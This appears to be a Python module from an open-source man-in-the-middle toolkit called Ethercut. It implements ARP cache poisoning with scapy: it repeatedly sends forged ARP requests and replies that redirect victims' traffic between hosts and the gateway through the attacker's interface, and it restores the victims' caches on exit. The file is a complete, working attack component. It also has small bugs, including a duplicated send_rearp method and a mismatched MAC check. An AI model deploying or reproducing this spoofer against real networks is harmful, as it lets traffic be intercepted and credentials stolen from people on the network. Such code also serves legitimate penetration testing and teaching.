# coding: utf-8

# ETHERCUT SUITE
# Author: Ivan 'evilgroot' Luengo
# Email: evilgroot@gmail.com

# This project is released under a GPLv3 license

"""
Mitm by arp spoofing
"""

import time
import ethercut.types.ticker as ticker
import ethercut.mitm.base as base

from ethercut.context import ctx
from scapy.layers.l2 import Ether, ARP

class ARPSpoofer(base.Spoofer):

    __slots__ = [ "new", "curr", "group1", "group2" ]

    name = "ARP"

    def __init__(self):
        super(ARPSpoofer, self).__init__(ticker.Ticker(3.0, self.spoof))
        self.new = []
        self.curr = []
        self.group1 = []
        self.group2 = []

    def spoof(self):
        """
        Spoofing activity
        """
        self.build_spoof_list()

        for t1 in self.group1:
            for t2 in self.group2:
                # Skip equal IP and MAC addresses
                if t2.ip == t1.ip and t2.mac == t1.mac:
                    continue
                # If the target is new, spoof it by sending ARP queries to force an entry
                # in the victim's cache
                if t1 in self.new or t2 in self.new:
                    self.send_spoofed_req(t1, t2.ip)
                    # If we are attacking in full-duplex mode, spoof from target2 to target1
                    if ctx.opt.attack.full_duplex:
                        self.send_spoofed_req(t2, t1.ip)
                else:
                    # Send spoofed ARP replies
                    self.send_spoofed_rep(t1, t2.ip)
                    # If we are attacking in full-duplex mode, spoof from target2 to target1
                    if ctx.opt.attack.full_duplex:
                        self.send_spoofed_rep(t2, t1.ip)
            # If we are no longer running, break the loop
                if not self.running:
                    break
            if not self.running:
                break

    def rearp(self):
        """
        Restores the cache of the victims
        """
        for x in xrange(2):
            for t1 in self.group1:
                for t2 in self.group2:
                    # Skip equal IP and MAC addresses
                    if t2.ip == t1.ip and t2.mac == t1.mac:
                        continue
                    self.send_rearp(t1, t2)
                    if ctx.opt.attack.full_duplex:
                        self.send_rearp(t2, t1)
            time.sleep(1)

    def stop(self):
        super(ARPSpoofer, self).stop()
        self.rearp()    # Re-ARP the targets before terminating

    def send_rearp(self, t1, t2):
        """
        Send a real reply to t1 as t2 to restore the cache.
        """
        rearp = Ether( src=t2.mac,
                       dst=t1.mac,
                       type=0x0806 ) /\
                ARP( hwsrc=t2.mac,
                     psrc=t2.ip,
                     hwdst=t1.mac,
                     pdst=t1.ip,
                     op=2)
        self.ctx.injector.push(rearp)

    def build_spoof_list(self):
        """
        Builds the spoofing list by dividing the current hosts in the target list in two groups
        as specified in target1 and target2.
        Also, keeps track of new targets to send them ARP spoofed queries aswell
        """
        self.new = []
        self.group1 = []
        self.group2 = [ctx.gateway]
        for t in ctx.targetlist:
            # Get new targets
            if t not in self.curr:
                self.new.append(t)
            # Add them to their group
            if ctx.target1.all or ((ctx.target1.ip is None or t.ip in ctx.target1.ip) and
                (ctx.target1.mac is None or t.mac in ctx.target2.mac)):
                self.group1.append(t)
            if ctx.target2.all or ((ctx.target2.ip is None or t.ip in ctx.target2.ip) and
                (ctx.target2.mac is None or t.mac in ctx.target2.mac)):
                self.group2.append(t)

        self.curr = ctx.targetlist.targets.values()

    def send_spoofed_rep(self, target, ip):
        """
        Pushes a spoofed ARP reply message to the packet injector queue.

        +param:  target - Target instance representing the victim
        +param:  ip     - IP address to be spoofed
        """
        spfd = Ether( src=ctx.iface.mac,
                      dst=target.mac,
                      type=0x0806 ) /\
               ARP( hwsrc=ctx.iface.mac,
                    psrc=ip,
                    hwdst=target.mac,
                    pdst=target.ip,
                    op=2 )
        ctx.injector.push(spfd)

    def send_spoofed_req(self, target, ip):
        """
        Pushes a spoofed ARP query message to the packet injector queue.

        +param:  target - Target instance representing the victim
        +param:  ip     - IP address to be spoofed
        """
        spfd = Ether( src=ctx.iface.mac,
                      dst="ff:ff:ff:ff:ff:ff",
                      type=0x0806 ) /\
               ARP( hwsrc=ctx.iface.mac,
                    psrc=ip,
                    hwdst="00:00:00:00:00:00",
                    pdst=target.ip,
                    op=1 )
        ctx.injector.push(spfd)

    def send_rearp(self, t1, t2):
        """
        Send a real reply to t1 as t2 to restore the cache
        """
        rearp = Ether( src=t2.mac,
                       dst=t1.mac,
                       type=0x0806 ) /\
                ARP( hwsrc=t2.mac,
                     psrc=t2.ip,
                     hwdst=t1.mac,
                     pdst=t1.ip,
                     op=2)
        ctx.injector.push(rearp)
